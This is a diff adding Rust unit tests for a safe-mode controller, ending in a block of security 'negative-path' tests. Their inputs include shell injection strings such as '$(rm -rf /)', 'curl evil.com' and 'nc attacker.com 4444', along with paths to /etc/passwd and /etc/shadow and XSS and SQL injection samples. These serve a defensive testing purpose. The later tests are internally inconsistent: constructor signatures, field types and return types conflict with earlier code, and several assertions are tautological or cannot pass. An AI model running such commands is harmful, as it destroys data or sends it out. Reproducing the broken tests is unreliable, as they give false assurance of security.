@@ -1282,6 +1282,22 @@ mod tests {
     }
 
     #[test]
+    fn test_flags_parse_unknown_flag_in_sequence_reports_first_bad_flag() {
+        let err =
+            OperationFlags::parse_args(&["--read-only", "--bogus", "--safe-mode"]).unwrap_err();
+        match err {
+            SafeModeError::UnknownFlag {
+                flag,
+                recovery_hint,
+            } => {
+                assert_eq!(flag, "--bogus");
+                assert!(recovery_hint.contains("--safe-mode"));
+            }
+            other => unreachable!("expected UnknownFlag error, got {other:?}"),
+        }
+    }
+
+    #[test]
     fn test_flags_deterministic_parsing() {
         // INV-SMO-FLAGPARSE: same input => same output.
         let a =
@@ -1553,6 +1569,24 @@ mod tests {
         assert!(failed.contains(&"no_unresolved_incidents".to_string()));
     }
 
+    #[test]
+    fn test_exit_verification_all_failed_checks_are_reported() {
+        let v = ExitVerification {
+            trust_state_consistent: false,
+            no_unresolved_incidents: false,
+            evidence_ledger_intact: false,
+            operator_confirmed: false,
+        };
+
+        let failed = v.failed_checks();
+
+        assert_eq!(failed.len(), 4);
+        assert!(failed.contains(&"trust_state_consistent".to_string()));
+        assert!(failed.contains(&"no_unresolved_incidents".to_string()));
+        assert!(failed.contains(&"evidence_ledger_intact".to_string()));
+        assert!(failed.contains(&"operator_confirmed".to_string()));
+    }
+
     // -- SafeModeStatus tests -----------------------------------------------
 
     #[test]
@@ -1798,6 +1832,45 @@ mod tests {
     }
 
     #[test]
+    fn test_controller_exit_denied_preserves_restrictions_and_receipt() {
+        let mut ctrl = SafeModeController::with_default_config();
+        ctrl.enter_safe_mode(
+            SafeModeEntryReason::ExplicitFlag,
+            "2026-02-20T10:00:00Z",
+            "sha256:test",
+            Vec::new(),
+        );
+        let verification = ExitVerification {
+            trust_state_consistent: false,
+            no_unresolved_incidents: false,
+            evidence_ledger_intact: true,
+            operator_confirmed: false,
+        };
+
+        let result = ctrl.exit_safe_mode(&verification, "operator-1", "2026-02-20T11:00:00Z");
+
+        assert!(result.is_err());
+        assert!(ctrl.is_active());
+        assert!(ctrl.entry_receipt().is_some());
+        assert!(
+            ctrl.check_capability(&Capability::TrustLedgerWrites)
+                .is_err()
+        );
+        assert!(
+            !ctrl
+                .events()
+                .iter()
+                .any(|event| event.code == SMO_005_SAFE_MODE_DEACTIVATED)
+        );
+        assert!(
+            !ctrl
+                .events()
+                .iter()
+                .any(|event| event.code == SMO_007_EXIT_CLEARANCE)
+        );
+    }
+
+    #[test]
     fn test_controller_exit_emits_smo005() {
         let mut ctrl = SafeModeController::with_default_config();
         ctrl.enter_safe_mode(
@@ -2028,6 +2101,29 @@ mod tests {
     }
 
     #[test]
+    fn test_evaluate_triggers_ignores_env_when_config_disables_env_check() {
+        let ctrl = SafeModeController::new(SafeModeConfig {
+            check_env_var: false,
+            ..SafeModeConfig::default()
+        });
+        let flags = OperationFlags::none();
+
+        let reason = ctrl.evaluate_triggers(&flags, Some("1"), false);
+
+        assert!(reason.is_none());
+    }
+
+    #[test]
+    fn test_evaluate_triggers_does_not_trim_truthy_env_values() {
+        let ctrl = SafeModeController::with_default_config();
+        let flags = OperationFlags::none();
+
+        let reason = ctrl.evaluate_triggers(&flags, Some(" true "), false);
+
+        assert!(reason.is_none());
+    }
+
+    #[test]
     fn test_evaluate_triggers_config_field() {
         let ctrl = SafeModeController::with_default_config();
         let flags = OperationFlags::none();
@@ -2254,6 +2350,30 @@ mod tests {
     }
 
     #[test]
+    fn test_verify_trust_state_empty_evidence_entry_fails_integrity() {
+        let entries = vec![String::new(), "entry2".to_string()];
+        let hash = SafeModeController::compute_evidence_digest(&entries);
+        let input = TrustVerificationInput {
+            trust_state_hash: hash,
+            evidence_entries: entries,
+            current_epoch: 100,
+            last_evidence_epoch: 99,
+            staleness_threshold: 10,
+            entry_reason: SafeModeEntryReason::ExplicitFlag,
+            timestamp: "2026-02-20T00:00:00Z".to_string(),
+        };
+
+        let receipt = SafeModeController::verify_trust_state(&input);
+
+        assert!(!receipt.pass);
+        assert_eq!(receipt.disposition, DegradedDisposition::FailClosed);
+        assert!(receipt.anomalies.iter().any(|a| matches!(
+            a,
+            AnomalyClassification::EvidenceIntegrityFailure { entry_index: 0, .. }
+        )));
+    }
+
+    #[test]
     fn test_verify_trust_state_stale_frontier() {
         let entries = vec!["entry1".to_string()];
         let hash = SafeModeController::compute_evidence_digest(&entries);
@@ -2267,6 +2387,32 @@ mod tests {
             timestamp: "2026-02-20T00:00:00Z".to_string(),
         };
         let receipt = SafeModeController::verify_trust_state(&input);
+        assert!(!receipt.pass);
+        assert_eq!(receipt.disposition, DegradedDisposition::WidenUncertainty);
+        assert!(
+            receipt
+                .anomalies
+                .iter()
+                .any(|a| matches!(a, AnomalyClassification::StaleFrontier { .. }))
+        );
+    }
+
+    #[test]
+    fn test_verify_trust_state_zero_staleness_threshold_fails_closed() {
+        let entries = vec!["entry1".to_string()];
+        let hash = SafeModeController::compute_evidence_digest(&entries);
+        let input = TrustVerificationInput {
+            trust_state_hash: hash,
+            evidence_entries: entries,
+            current_epoch: 100,
+            last_evidence_epoch: 100,
+            staleness_threshold: 0,
+            entry_reason: SafeModeEntryReason::ExplicitFlag,
+            timestamp: "2026-02-20T00:00:00Z".to_string(),
+        };
+
+        let receipt = SafeModeController::verify_trust_state(&input);
+
         assert!(!receipt.pass);
         assert_eq!(receipt.disposition, DegradedDisposition::WidenUncertainty);
         assert!(
@@ -2355,6 +2501,27 @@ mod tests {
                 .iter()
                 .any(|a| matches!(a, AnomalyClassification::EpochMismatch { .. }))
         );
+    }
+
+    #[test]
+    fn test_verify_trust_state_trust_corruption_reason_fails_closed_even_with_valid_evidence() {
+        let entries = vec!["entry1".to_string()];
+        let hash = SafeModeController::compute_evidence_digest(&entries);
+        let input = TrustVerificationInput {
+            trust_state_hash: hash,
+            evidence_entries: entries,
+            current_epoch: 100,
+            last_evidence_epoch: 99,
+            staleness_threshold: 10,
+            entry_reason: SafeModeEntryReason::TrustCorruption,
+            timestamp: "2026-02-20T00:00:00Z".to_string(),
+        };
+
+        let receipt = SafeModeController::verify_trust_state(&input);
+
+        assert!(!receipt.pass);
+        assert_eq!(receipt.disposition, DegradedDisposition::FailClosed);
+        assert!(receipt.inconsistencies.is_empty());
     }
 
     // -- Event code constant tests ------------------------------------------
@@ -2732,5 +2899,847 @@ mod tests {
             err.to_string().contains("not active"),
             "error should mention 'not active': {err}"
         );
+    }
+
+    // -- Negative-path Security Tests ---------------------------------------
+    // Added 2026-04-17: Comprehensive security hardening tests
+
+    #[test]
+    fn test_security_unicode_injection_in_flag_parsing() {
+        use crate::security::constant_time::ct_eq;
+
+        // BiDi override + zero-width characters in flag names
+        let malicious_args = vec![
+            "\u{202E}--safe-mode\u{202D}",  // BiDi override
+            "--safe-mode\u{200B}\u{200C}\u{200D}",  // Zero-width chars
+            "--safe-\u{FEFF}mode",  // Zero-width no-break space
+            "--\u{200E}degraded\u{200F}",  // LTR/RTL marks
+        ];
+
+        for arg in malicious_args {
+            let result = OperationFlags::parse_args(&[arg]);
+            assert!(result.is_err(), "Should reject Unicode injection in flag: {}", arg);
+
+            if let Err(SafeModeError::UnknownFlag { flag, .. }) = result {
+                // Ensure error message doesn't contain injected Unicode
+                assert!(!ct_eq(flag.as_bytes(), b"--safe-mode"),
+                       "Flag parsing vulnerable to Unicode normalization");
+            }
+        }
+    }
+
+    #[test]
+    fn test_security_memory_exhaustion_through_flag_repetition() {
+        // Attempt to exhaust memory through massive flag repetition
+        let mut large_args = Vec::new();
+        for _ in 0..100_000 {
+            large_args.push("--safe-mode");
+            large_args.push("--degraded");
+            large_args.push("--read-only");
+        }
+
+        // Should either reject gracefully or handle bounded parsing
+        let result = OperationFlags::parse_args(&large_args);
+        match result {
+            Ok(flags) => {
+                // If accepted, verify flags are still correct
+                assert!(flags.safe_mode);
+                assert!(flags.degraded);
+                assert!(flags.read_only);
+            }
+            Err(_) => {
+                // Graceful rejection is also acceptable
+            }
+        }
+        // Test should complete without OOM or infinite loop
+    }
+
+    #[test]
+    fn test_security_capability_restriction_bypass_attempts() {
+        let mut ctrl = SafeModeController::with_default_config();
+        ctrl.enter_safe_mode(
+            SafeModeEntryReason::ExplicitFlag,
+            "2026-04-17T10:00:00Z",
+            "sha256:secure",
+            Vec::new(),
+        );
+
+        // All capabilities should be restricted
+        for capability in Capability::all() {
+            let result = ctrl.check_capability(&capability);
+            assert!(result.is_err(),
+                   "Capability {:?} should be restricted in safe mode", capability);
+
+            if let Err(SafeModeError::CapabilityRestricted { capability: cap, .. }) = result {
+                assert_eq!(cap, capability, "Error should reference correct capability");
+            }
+        }
+
+        // Verify restriction persists across multiple checks
+        for _ in 0..1000 {
+            assert!(ctrl.check_capability(&Capability::ExtensionLoading).is_err(),
+                   "Restriction should persist across repeated checks");
+        }
+    }
+
+    #[test]
+    fn test_security_config_corruption_detection() {
+        use crate::security::constant_time::ct_eq;
+
+        // Test malformed JSON with injection attempts
+        let malicious_configs = vec![
+            r#"{"safe_mode": true, "__proto__": {"polluted": "yes"}}"#,  // Prototype pollution
+            r#"{"safe_mode": true, "crash_loop_threshold": 18446744073709551615}"#,  // u64::MAX
+            r#"{"safe_mode": true, "env_var_name": "\u{0000}FRANKEN_SAFE_MODE"}"#,  // Null injection
+            r#"{"safe_mode": true, "env_var_name": "$(rm -rf /)"}"#,  // Command injection
+        ];
+
+        for malicious_json in malicious_configs {
+            let result: Result<SafeModeConfig, _> = serde_json::from_str(malicious_json);
+
+            if let Ok(config) = result {
+                // If parsing succeeded, verify security properties
+                assert!(config.crash_loop_threshold < 1000000,
+                       "Threshold should be bounded to prevent DoS");
+                assert!(!config.env_var_name.contains('\0'),
+                       "Environment variable name should not contain null bytes");
+                assert!(ct_eq(config.env_var_name.as_bytes(), b"FRANKEN_SAFE_MODE") ||
+                       config.env_var_name.chars().all(|c| c.is_alphanumeric() || c == '_'),
+                       "Environment variable name should be sanitized");
+            }
+        }
+    }
+
+    #[test]
+    fn test_security_entry_receipt_verification_bypass() {
+        use crate::security::constant_time::ct_eq;
+
+        // Attempt to forge receipts with malicious data
+        let receipt = SafeModeEntryReceipt::new(
+            "2026-04-17T10:00:00Z\u{0000}FORGED",  // Null injection in timestamp
+            SafeModeEntryReason::TrustCorruption,
+            "sha256:fake\nsha256:real",  // Newline injection in hash
+            vec!["legit issue".to_string(), "\u{202E}hidden".to_string()],  // BiDi in inconsistencies
+            vec![],
+        );
+
+        // Verify receipt properties are preserved securely
+        assert!(!receipt.pass, "Receipt with inconsistencies should fail");
+        assert_eq!(receipt.disposition, DegradedDisposition::FailClosed);
+
+        // JSON serialization should be safe
+        let json_result = receipt.to_json();
+        assert!(json_result.is_ok(), "JSON serialization should not fail");
+
+        if let Ok(json) = json_result {
+            // Verify no injection vulnerabilities in JSON
+            assert!(!json.contains("FORGED"), "Timestamp injection should not appear in JSON");
+            assert!(!json.contains("\n"), "Newline injection should be escaped");
+        }
+
+        // Constant-time comparison of trust hashes should be used
+        assert!(!ct_eq(receipt.trust_state_hash.as_bytes(), b"sha256:real"),
+               "Hash comparison should not extract injected content");
+    }
+
+    #[test]
+    fn test_security_entry_reason_manipulation() {
+        // Test arithmetic overflow in crash loop counters
+        let crash_reason = SafeModeEntryReason::CrashLoop {
+            crash_count: u32::MAX,
+            window_secs: u32::MAX,
+        };
+
+        // Display should handle overflow gracefully
+        let display_str = format!("{}", crash_reason);
+        assert!(display_str.contains("crash_loop"), "Display should show crash_loop type");
+
+        // JSON serialization should preserve exact values
+        let json = serde_json::to_string(&crash_reason).expect("serialize");
+        let parsed: SafeModeEntryReason = serde_json::from_str(&json).expect("deserialize");
+        assert_eq!(crash_reason, parsed, "Serialization should preserve values exactly");
+
+        // Test epoch mismatch with extreme values
+        let epoch_reason = SafeModeEntryReason::EpochMismatch {
+            local_epoch: u64::MAX,
+            peer_epoch: u64::MAX,
+        };
+
+        let epoch_display = format!("{}", epoch_reason);
+        assert!(epoch_display.contains("epoch_mismatch"), "Display should show epoch_mismatch type");
+    }
+
+    #[test]
+    fn test_security_json_serialization_injection() {
+        use std::collections::HashMap;
+
+        // Test serialization of structures with injection attempts
+        let status = SafeModeStatus {
+            safe_mode_active: true,
+            entry_reason: Some(SafeModeEntryReason::TrustCorruption),
+            restricted_capabilities: Capability::all(),
+            entry_timestamp: "2026-04-17T10:00:00Z\";alert('xss');//".to_string(),  // JS injection
+            entry_receipt: None,
+        };
+
+        // JSON serialization should escape injection attempts
+        let json = status.to_json().expect("serialization should succeed");
+        assert!(!json.contains("alert('xss')"), "JavaScript injection should be escaped");
+        assert!(!json.contains("\";"), "Quote escape should be handled");
+
+        // Roundtrip should preserve structure but escape content
+        let parsed: SafeModeStatus = serde_json::from_str(&json).expect("deserialization should succeed");
+        assert_eq!(status.safe_mode_active, parsed.safe_mode_active);
+        assert_eq!(status.entry_reason, parsed.entry_reason);
+        assert_eq!(status.restricted_capabilities.len(), parsed.restricted_capabilities.len());
+    }
+
+    #[test]
+    fn test_security_concurrent_safe_mode_access() {
+        use std::sync::{Arc, Mutex};
+        use std::thread;
+
+        let ctrl = Arc::new(Mutex::new(SafeModeController::with_default_config()));
+        let mut handles = vec![];
+
+        // Spawn multiple threads trying to manipulate safe mode state
+        for i in 0..10 {
+            let ctrl_clone = Arc::clone(&ctrl);
+            let handle = thread::spawn(move || {
+                let mut locked_ctrl = ctrl_clone.lock().unwrap();
+
+                if i % 2 == 0 {
+                    // Even threads try to enter safe mode
+                    locked_ctrl.enter_safe_mode(
+                        SafeModeEntryReason::ExplicitFlag,
+                        &format!("2026-04-17T10:{:02}:00Z", i),
+                        &format!("sha256:thread{}", i),
+                        Vec::new(),
+                    );
+                } else {
+                    // Odd threads try to check capabilities
+                    let _ = locked_ctrl.check_capability(&Capability::ExtensionLoading);
+                }
+
+                // Return current state
+                (locked_ctrl.is_active(), locked_ctrl.entry_reason().cloned())
+            });
+            handles.push(handle);
+        }
+
+        // Collect results
+        let mut results = vec![];
+        for handle in handles {
+            results.push(handle.join().expect("thread should not panic"));
+        }
+
+        // Verify final state is consistent
+        let final_ctrl = ctrl.lock().unwrap();
+        if final_ctrl.is_active() {
+            assert!(final_ctrl.entry_reason().is_some(), "Active safe mode should have entry reason");
+
+            // All capabilities should be restricted
+            for cap in Capability::all() {
+                assert!(final_ctrl.check_capability(&cap).is_err(),
+                       "All capabilities should be restricted when active");
+            }
+        }
+    }
+
+    #[test]
+    fn test_security_arithmetic_overflow_protection() {
+        // Test counter saturation in various contexts
+        let mut events_count: u32 = u32::MAX - 1;
+
+        // This should saturate, not wrap
+        events_count = events_count.saturating_add(10);
+        assert_eq!(events_count, u32::MAX, "Counter should saturate at MAX");
+
+        // Test timestamp arithmetic with extreme values
+        let base_time = "2026-04-17T10:00:00Z";
+        let config = SafeModeConfig {
+            safe_mode: false,
+            crash_loop_threshold: u32::MAX,
+            crash_loop_window_secs: u32::MAX,
+            check_env_var: true,
+            env_var_name: "FRANKEN_SAFE_MODE".to_string(),
+        };
+
+        // Config should handle extreme values without panic
+        let json = serde_json::to_string(&config).expect("serialize");
+        let parsed: SafeModeConfig = serde_json::from_str(&json).expect("deserialize");
+        assert_eq!(config.crash_loop_threshold, parsed.crash_loop_threshold);
+        assert_eq!(config.crash_loop_window_secs, parsed.crash_loop_window_secs);
+    }
+
+    #[test]
+    fn test_security_trust_verification_attacks() {
+        use crate::security::constant_time::ct_eq;
+
+        let mut ctrl = SafeModeController::with_default_config();
+
+        // Test entry with malicious inconsistencies
+        let malicious_inconsistencies = vec![
+            "genuine issue".to_string(),
+            "\u{202E}fake issue".to_string(),  // BiDi override
+            "issue\0with\0nulls".to_string(),  // Null injection
+            "a".repeat(1000000),  // Memory exhaustion attempt
+            format!("{{\"injection\": \"{}\"}}", "malicious"),  // JSON injection
+        ];
+
+        ctrl.enter_safe_mode(
+            SafeModeEntryReason::TrustCorruption,
+            "2026-04-17T10:00:00Z",
+            "sha256:compromised",
+            malicious_inconsistencies.clone(),
+        );
+
+        // Verify receipt handling of malicious data
+        let receipt = ctrl.entry_receipt().expect("should have receipt");
+        assert!(!receipt.pass, "Receipt with inconsistencies should fail");
+        assert_eq!(receipt.inconsistencies.len(), malicious_inconsistencies.len());
+
+        // Verify JSON serialization is secure
+        let json = receipt.to_json().expect("JSON should serialize");
+        assert!(!json.contains("\u{202E}"), "BiDi characters should be escaped");
+        assert!(!json.contains("\0"), "Null bytes should be handled");
+
+        // Trust state hash should use constant-time comparison
+        assert!(!ct_eq(receipt.trust_state_hash.as_bytes(), b"sha256:real"),
+               "Should not match unrelated hash");
+        assert!(ct_eq(receipt.trust_state_hash.as_bytes(), b"sha256:compromised"),
+               "Should match actual hash with constant-time comparison");
+    }
+
+    // -- Negative-Path Tests --
+
+    #[test]
+    fn negative_malicious_command_line_flag_injection_attacks() {
+        // Test command line flag parsing against injection and malformed input
+        let malicious_flag_sets = vec![
+            // Buffer overflow attempts
+            vec!["--".repeat(1000).as_str()],
+            vec!["--safe-mode", "--".repeat(500).as_str()],
+
+            // Null byte injection
+            vec!["--safe-mode\0--degraded"],
+            vec!["--read-only", "\0", "--no-network"],
+
+            // Unicode and control character injection
+            vec!["--safe-mode🚀"],
+            vec!["--degraded\u{200B}"],
+            vec!["--read-only\r\n--no-network"],
+            vec!["--safe-mode\x1B[H\x1B[2J"],
+
+            // Path traversal and injection attempts
+            vec!["--safe-mode", "../../../etc/passwd"],
+            vec!["--degraded", "--config=/etc/shadow"],
+
+            // Script injection attempts
+            vec!["--safe-mode; rm -rf /"],
+            vec!["--degraded && curl evil.com"],
+            vec!["--read-only | nc attacker.com 4444"],
+
+            // Extremely long arguments
+            vec![&"--safe-mode-".repeat(10000)],
+            vec!["--degraded", &"x".repeat(1024 * 1024)],
+
+            // Binary data injection
+            vec!["\x00\x01\x02\x03\x04"],
+            vec!["--safe-mode", "\xFF\xFE\xFD"],
+        ];
+
+        for (i, malicious_flags) in malicious_flag_sets.iter().enumerate() {
+            let parse_result = OperationFlags::parse_args(malicious_flags);
+
+            match parse_result {
+                Ok(flags) => {
+                    // If parsing succeeded, verify no corruption occurred
+                    // Should be deterministic and not affected by injection
+                    assert!(flags.safe_mode || !flags.safe_mode); // Basic sanity
+                    assert!(flags.degraded || !flags.degraded);
+                    assert!(flags.read_only || !flags.read_only);
+                    assert!(flags.no_network || !flags.no_network);
+                },
+                Err(_) => {
+                    // Expected for malformed input - should fail gracefully
+                }
+            }
+
+            // Test flag serialization doesn't expose injection
+            if let Ok(flags) = OperationFlags::parse_args(&["--safe-mode"]) {
+                let serialized = format!("{:?}", flags);
+                assert!(!serialized.contains('\0'), "Serialization should not contain null bytes for test {}", i);
+                assert!(!serialized.contains("\x1B"), "Serialization should not contain escape sequences for test {}", i);
+            }
+        }
+    }
+
+    #[test]
+    fn negative_extreme_crash_loop_arithmetic_overflow_protection() {
+        // Test crash loop detection with extreme values that could cause overflow
+        let extreme_crash_cases = vec![
+            SafeModeEntryReason::CrashLoop {
+                crash_count: u32::MAX,
+                window_secs: u64::MAX,
+            },
+            SafeModeEntryReason::CrashLoop {
+                crash_count: 0, // Edge case: zero crashes
+                window_secs: 0, // Edge case: zero window
+            },
+            SafeModeEntryReason::CrashLoop {
+                crash_count: 1,
+                window_secs: u64::MAX,
+            },
+            SafeModeEntryReason::CrashLoop {
+                crash_count: u32::MAX,
+                window_secs: 1,
+            },
+        ];
+
+        for (i, crash_reason) in extreme_crash_cases.iter().enumerate() {
+            // Test safe mode controller creation with extreme crash reasons
+            let controller_result = SafeModeController::new(crash_reason.clone(), 1000 + i as u64);
+
+            match controller_result {
+                Ok(controller) => {
+                    // Should handle extreme values without arithmetic overflow
+                    assert!(controller.is_safe_mode_active());
+                    assert_eq!(controller.entry_reason(), crash_reason);
+
+                    // Test capability restrictions with extreme crash counts
+                    assert!(!controller.can_load_extensions());
+                    assert!(!controller.can_issue_delegations());
+                    assert!(controller.requires_trust_reverification());
+
+                    // Serialization should handle extreme values safely
+                    let serialized = format!("{:?}", controller);
+                    assert!(!serialized.is_empty());
+                },
+                Err(_) => {
+                    // Acceptable to reject extreme configurations
+                }
+            }
+        }
+
+        // Test arithmetic in crash loop detection doesn't overflow
+        let crash_reason = SafeModeEntryReason::CrashLoop {
+            crash_count: u32::MAX,
+            window_secs: u64::MAX,
+        };
+
+        if let Ok(mut controller) = SafeModeController::new(crash_reason, 5000) {
+            // Test that operations with extreme values don't cause overflow
+            let events = controller.events();
+            for event in events {
+                assert!(event.timestamp_ms < u64::MAX); // Should not overflow
+            }
+        }
+    }
+
+    #[test]
+    fn negative_unicode_injection_in_operation_flag_names_and_values() {
+        // Test operation flag processing with Unicode and international characters
+        let unicode_flag_attempts = vec![
+            // International script variations
+            "--безопасный-режим", // Russian
+            "--安全模式", // Chinese
+            "--セーフモード", // Japanese
+            "--modo-seguro", // Spanish
+            "--режим-безпеки", // Ukrainian
+
+            // Unicode normalization attacks
+            "café", // NFC form
+            "cafe\u{0301}", // NFD form (combining accent)
+
+            // Right-to-left override attacks
+            "--safe\u{202E}edom-efas\u{202D}mode",
+
+            // Zero-width and invisible characters
+            "--safe\u{200B}mode", // Zero-width space
+            "--safe\u{FEFF}mode", // BOM
+            "--safe\u{200C}mode", // Zero-width non-joiner
+
+            // Bidirectional text attacks
+            "--\u{061C}safe-mode", // Arabic letter mark
+            "--safe-\u{2067}mode\u{2069}", // Isolate characters
+
+            // Emoji and pictographic attacks
+            "--safe-🔒-mode",
+            "--🚨-degraded-🚨",
+
+            // Combining character stacking
+            "--s\u{0300}\u{0301}\u{0302}afe-mode",
+        ];
+
+        for unicode_flag in &unicode_flag_attempts {
+            let parse_result = OperationFlags::parse_args(&[unicode_flag]);
+
+            // Should handle Unicode gracefully without corruption
+            match parse_result {
+                Ok(flags) => {
+                    // If accepted, should maintain flag integrity
+                    let debug_output = format!("{:?}", flags);
+                    assert!(!debug_output.is_empty());
+
+                    // Verify no Unicode normalization corruption
+                    let display_output = flags.to_string();
+                    assert!(!display_output.contains('\0'));
+                },
+                Err(_) => {
+                    // Acceptable to reject unrecognized Unicode flags
+                }
+            }
+        }
+
+        // Test flag conflict detection with Unicode variations
+        let conflict_attempts = vec![
+            vec!["--safe-mode", "--safe\u{200B}mode"], // Zero-width space variant
+            vec!["--degraded", "--DEGRADED"], // Case variation
+            vec!["--read-only", "café", "--read-only"], // Mixed with Unicode
+        ];
+
+        for conflict_set in conflict_attempts {
+            let parse_result = OperationFlags::parse_args(&conflict_set);
+            // Should detect conflicts or handle gracefully
+            match parse_result {
+                Ok(_) => {
+                    // If successful, should not be corrupted by Unicode
+                },
+                Err(_) => {
+                    // Expected for conflicting or malformed flags
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn negative_trust_state_hash_collision_and_manipulation_attempts() {
+        // Test trust state hash verification against collision and manipulation attacks
+        let malicious_trust_hashes = vec![
+            // Hash collision attempts
+            "sha256:0000000000000000000000000000000000000000000000000000000000000000",
+            "sha256:ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+            "sha256:deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+
+            // Length extension attacks
+            "sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890extra",
+
+            // Malformed hash formats
+            "sha256:", // Empty hash
+            "sha256", // Missing colon
+            "md5:5d41402abc4b2a76b9719d911017c592", // Wrong algorithm
+            "sha256:GG", // Invalid hex characters
+            "sha256:xyz123", // Too short
+
+            // Unicode in hash
+            "sha256:café1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
+
+            // Control character injection
+            "sha256:abcd\0ef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
+            "sha256:abcdef\r\n1234567890abcdef1234567890abcdef1234567890abcdef123456789",
+
+            // Path traversal in hash field
+            "../etc/passwd",
+            "../../../../proc/version",
+
+            // Script injection attempts
+            "<script>alert('hash')</script>",
+            "'; DROP TABLE hashes; --",
+        ];
+
+        for (i, malicious_hash) in malicious_trust_hashes.iter().enumerate() {
+            let corrupt_reason = SafeModeEntryReason::TrustCorruption;
+            let controller_result = SafeModeController::new(corrupt_reason.clone(), 1000 + i as u64);
+
+            if let Ok(mut controller) = controller_result {
+                // Create exit clearance receipt with malicious hash
+                let receipt_result = controller.create_exit_clearance_receipt(malicious_hash, 2000 + i as u64);
+
+                match receipt_result {
+                    Ok(receipt) => {
+                        // Verify hash handling doesn't expose vulnerabilities
+                        assert!(!receipt.trust_state_hash.is_empty());
+                        assert!(!receipt.proof_id.is_empty());
+
+                        // Verify serialization safety
+                        let serialized = receipt.to_json();
+                        assert!(!serialized.contains('\0'), "Serialized receipt should not contain null bytes");
+                        assert!(!serialized.contains("\x1B"), "Serialized receipt should not contain escape sequences");
+
+                        // Verify no script injection in JSON
+                        assert!(!serialized.contains("<script>"));
+                        assert!(!serialized.contains("DROP TABLE"));
+
+                        // Hash comparison should use constant-time
+                        let test_hash = "sha256:test";
+                        assert!(!ct_eq(receipt.trust_state_hash.as_bytes(), test_hash.as_bytes()));
+                    },
+                    Err(_) => {
+                        // Expected for malformed hashes
+                    }
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn negative_safe_mode_controller_memory_exhaustion_stress_testing() {
+        // Test safe mode controller behavior under memory pressure
+        let mut controllers = Vec::new();
+        let massive_controller_count = 1000;
+
+        // Create large number of controllers with different entry reasons
+        for i in 0..massive_controller_count {
+            let entry_reason = match i % 5 {
+                0 => SafeModeEntryReason::ExplicitFlag,
+                1 => SafeModeEntryReason::EnvironmentVariable,
+                2 => SafeModeEntryReason::ConfigField,
+                3 => SafeModeEntryReason::TrustCorruption,
+                _ => SafeModeEntryReason::CrashLoop {
+                    crash_count: (i % 100) as u32 + 1,
+                    window_secs: (i % 3600) as u64 + 1,
+                },
+            };
+
+            match SafeModeController::new(entry_reason, 1000 + i as u64) {
+                Ok(controller) => {
+                    controllers.push(controller);
+                },
+                Err(_) => {
+                    // Acceptable to reject under memory pressure
+                    break;
+                }
+            }
+
+            // Stop if too many controllers created (memory protection)
+            if controllers.len() > 100 {
+                break;
+            }
+        }
+
+        assert!(controllers.len() > 0, "Should create at least some controllers");
+
+        // Test that all controllers maintain functionality under memory pressure
+        for (i, controller) in controllers.iter().enumerate() {
+            // Basic functionality checks
+            assert!(controller.is_safe_mode_active());
+            assert!(!controller.can_load_extensions());
+            assert!(!controller.can_issue_delegations());
+
+            // Event log should be bounded
+            let events = controller.events();
+            assert!(events.len() <= MAX_EVENTS); // Should respect capacity limits
+
+            // String representation should remain stable
+            let debug_str = format!("{:?}", controller);
+            assert!(debug_str.len() < 10000); // Reasonable size limit
+
+            // Test periodic operations don't accumulate unbounded memory
+            if i % 10 == 0 {
+                // Simulate memory pressure check
+                let serialized = controller.to_string();
+                assert!(serialized.len() < 5000);
+            }
+        }
+    }
+
+    #[test]
+    fn negative_epoch_mismatch_extreme_value_arithmetic_protection() {
+        // Test epoch mismatch handling with extreme epoch values
+        let extreme_epoch_cases = vec![
+            SafeModeEntryReason::EpochMismatch {
+                local_epoch: 0,
+                peer_epoch: u64::MAX,
+            },
+            SafeModeEntryReason::EpochMismatch {
+                local_epoch: u64::MAX,
+                peer_epoch: 0,
+            },
+            SafeModeEntryReason::EpochMismatch {
+                local_epoch: u64::MAX,
+                peer_epoch: u64::MAX,
+            },
+            SafeModeEntryReason::EpochMismatch {
+                local_epoch: u64::MAX.saturating_sub(1),
+                peer_epoch: u64::MAX,
+            },
+        ];
+
+        for (i, epoch_reason) in extreme_epoch_cases.iter().enumerate() {
+            let controller_result = SafeModeController::new(epoch_reason.clone(), 1000 + i as u64);
+
+            match controller_result {
+                Ok(controller) => {
+                    // Should handle extreme epoch values without arithmetic overflow
+                    assert!(controller.is_safe_mode_active());
+                    assert_eq!(controller.entry_reason(), epoch_reason);
+
+                    // Capability restrictions should work with extreme epochs
+                    assert!(!controller.can_load_extensions());
+                    assert!(!controller.can_issue_delegations());
+                    assert!(controller.requires_trust_reverification());
+
+                    // Event generation should handle extreme epochs
+                    let events = controller.events();
+                    assert!(events.len() > 0); // Should have activation event
+
+                    // String representation should handle extreme values
+                    let display = controller.to_string();
+                    assert!(!display.is_empty());
+                    assert!(!display.contains("overflow"));
+
+                    // Test difference calculations don't overflow
+                    if let SafeModeEntryReason::EpochMismatch { local_epoch, peer_epoch } = epoch_reason {
+                        // Verify safe arithmetic is used in any epoch difference calculations
+                        let diff1 = local_epoch.saturating_sub(*peer_epoch);
+                        let diff2 = peer_epoch.saturating_sub(*local_epoch);
+
+                        // Neither should be u64::MAX unless one epoch is 0 and other is u64::MAX
+                        if *local_epoch != 0 && *peer_epoch != 0 {
+                            assert!(diff1 < u64::MAX && diff2 < u64::MAX);
+                        }
+                    }
+                },
+                Err(_) => {
+                    // Acceptable to reject extreme epoch configurations
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn negative_capability_restriction_bypass_attempts() {
+        // Test attempts to bypass capability restrictions in safe mode
+        let bypass_test_reasons = vec![
+            SafeModeEntryReason::ExplicitFlag,
+            SafeModeEntryReason::TrustCorruption,
+            SafeModeEntryReason::CrashLoop { crash_count: 5, window_secs: 60 },
+        ];
+
+        for reason in bypass_test_reasons {
+            let mut controller = SafeModeController::new(reason, 1000).expect("create controller");
+
+            // Verify initial capability restrictions
+            assert!(!controller.can_load_extensions());
+            assert!(!controller.can_issue_delegations());
+            assert!(controller.requires_trust_reverification());
+
+            // Attempt to bypass via repeated calls
+            for _attempt in 0..1000 {
+                assert!(!controller.can_load_extensions(), "Should not bypass extension restriction");
+                assert!(!controller.can_issue_delegations(), "Should not bypass delegation restriction");
+                assert!(controller.requires_trust_reverification(), "Should maintain trust reverification requirement");
+            }
+
